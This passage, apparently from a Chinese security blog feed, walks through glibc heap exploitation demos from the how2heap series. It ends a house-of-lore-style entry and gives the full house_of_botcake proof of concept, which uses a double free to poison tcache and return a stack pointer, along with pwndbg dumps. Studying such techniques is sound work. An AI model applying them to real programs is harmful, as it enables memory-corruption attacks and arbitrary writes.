class="comment">/* &#x27;PruUUU&#x27; */</span></span><br><span class="line">#BK: <span class="number">0x7fffffffdc80</span> —▸ <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x7fffffffdd40</span> —▸ <span class="number">0x7fffffffdd60</span> ◂— ...</span><br><span class="line">      tcache_put (tc_victim, tc_idx); <span class="comment">//放入tcachebin</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>循环之后效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620988759948-7860afbc-1c41-4081-a1a4-ee436def21b0.png#clientId=u6a6b61e5-c3b2-4&from=drop&id=OAwKZ&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2018.39.11.png&originHeight=748&originWidth=2750&originalType=binary&size=110492&status=done&style=none&taskId=u55484820-cb85-4263-93b3-9079bc83437" alt="截屏2021-05-14 18.39.11.png"><br>上面的过程看起来可能有些懵，可以使用画图的形式来展现：</p><blockquote><p>看不懂的话建议阅读 malloc 源码及我之前的文章。</p></blockquote><p>再次申请就可以控制 stack 上的堆块（b 130-&gt;c）（tcachebin 的优先级最高）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">#This last <span class="built_in">malloc</span> should trick the glibc <span class="built_in">malloc</span> to <span class="keyword">return</span> a chunk at the position injected in bin-&gt;bk</span><br><span class="line">#p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line">#The fwd pointer of stack_buffer_2 has changed after the last <span class="built_in">malloc</span> to <span class="number">0x7fffffffdcb0</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620988861068-3be2f9f0-b843-4db7-8b8c-d218bd2976e0.png#clientId=u6a6b61e5-c3b2-4&from=drop&id=C8NAQ&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2018.40.57.png&originHeight=748&originWidth=2752&originalType=binary&size=111070&status=done&style=none&taskId=uca39a6b9-5e3e-4ea6-ba7a-88069868503" alt="截屏2021-05-14 18.40.57.png"><br>接下来我们可以向 b 135-&gt;c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line"><span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"><span class="built_in">memcpy</span>((p4+<span class="number">40</span>), ≻, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line"><span class="comment">//0x55555555598b==0x55555555586A</span></span><br></pre></td></tr></table></figure><p>在执行上述代码之前这里再回顾一下 p4 里面有什么：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx p4</span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x00007fffffffdd70</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x00007fffffffde08</span><span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x007ffff7dcdda001</span><span class="number">0x00007fffffffdd00</span> <span class="comment">#0x000055555555486a</span></span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007ffff7de3b40</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x0000555555554fe0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x00007fffffffded0</span><span class="number">0x43bb3559a8bd3300</span></span><br><span class="line"><span class="number">0x7fffffffddf0</span>:<span class="number">0x0000555555554fe0</span><span class="number">0x00007ffff7a03bf7</span></span><br><span class="line"><span class="number">0x7fffffffde00</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffded8</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>__builtin_return_address(0)得到当前函数返回地址，放在这里就是这个函数返回 main 函数的返回地址；这里代码的意思是我们将 main 函数的 return 地址覆盖为了 jackpot，让 main 函数结束时调用 jackpot，但是这个 POC 好像有点问题，会在执行 assert 时导致程序的段错误：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621174709365-0feb153e-bfa6-40b2-8a29-cebf3f1762bf.png#clientId=u4f1cc8aa-dd3a-4&from=drop&id=u02345cc9&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-16%2022.18.20.png&originHeight=1800&originWidth=2880&originalType=binary&size=531898&status=done&style=none&taskId=ub6d3fbac-cee0-4169-b659-4c172187502" alt="截屏2021-05-16 22.18.20.png"></p><h1 id="联想-amp-amp-注意"><a href="#联想-amp-amp-注意" class="headerlink" title="联想&amp;&amp;注意"></a>联想&amp;&amp;注意</h1><p>当我看完这种攻击方式之后我立刻想到了之前的一种攻击方式–fastbin reverse into tcache：</p><p>同样的，这里也要注意堆块的伪造数量，我们来测试一下，将 POC 改为如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++) &#123;</span><br><span class="line">  fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621178324070-ded5926c-1174-424c-92b6-ff4ff714d592.png#clientId=u4f1cc8aa-dd3a-4&from=drop&id=ud8d71851&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-16%2023.18.35.png&originHeight=1800&originWidth=2880&originalType=binary&size=487253&status=done&style=none&taskId=u07e6a041-f2e2-4929-9b95-2fcd25e8b9f" alt="截屏2021-05-16 23.18.35.png"><br>经过调试可以知道在执行 bck-&gt;fd = bin;由于需要向 0x7ffff7dd5661（dl_main）写入 fd 指针，但是 ld-2.27.so 是无法写入的（段属性），在写入时会造成段错误，这一点要注意。</p><h1 id="POC-总结"><a href="#POC-总结" class="headerlink" title="POC 总结"></a>POC 总结</h1><p>直接一张图就行：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621177370357-4aa92191-654c-426a-8d9a-9572aefd0a68.png#clientId=u4f1cc8aa-dd3a-4&from=paste&height=900&id=ua6cbf6c3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1800&originWidth=2880&originalType=binary&size=325388&status=done&style=none&taskId=ucf9b1c88-1bd5-4721-89b8-c76b0a323ba&width=1440" alt="image.png"><br>将堆块直接伪造成如上图所示，我的感受就是这种攻击方式有点鸡肋还麻烦 😂。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(11)-house_of_botcake</title>
    <link href="https://cyberangel.cn/2021/05/13/how2heap(11)-house_of_botcake/"/>
    <id>https://cyberangel.cn/2021/05/13/how2heap(11)-house_of_botcake/</id>
    <published>2021-05-13T08:00:16.000Z</published>
    <updated>2021-07-04T09:57:11.892Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一小节我们来看 house of botcake 这种攻击方式。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><p>首先我们先对代码第 37 行下断点，开始进行调试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020641</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后创建一个堆块用来准备之后的整理工作（b 39-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">350</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_prev(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020531</span> #top_chunk</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们创建两个堆块：chunk_victim 和阻止和 top_chunk 合并的 chunk（b 46-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">400</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_prev(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757be0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> <span class="meta">#chunk(avoid top chunk)</span></span><br><span class="line"><span class="number">0x555555757bf0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757c00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020401</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来开始对 heap chunk 进行攻击，首先释放 7 个堆块填满对应大小的 tcachebin（b 51-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cause chunk 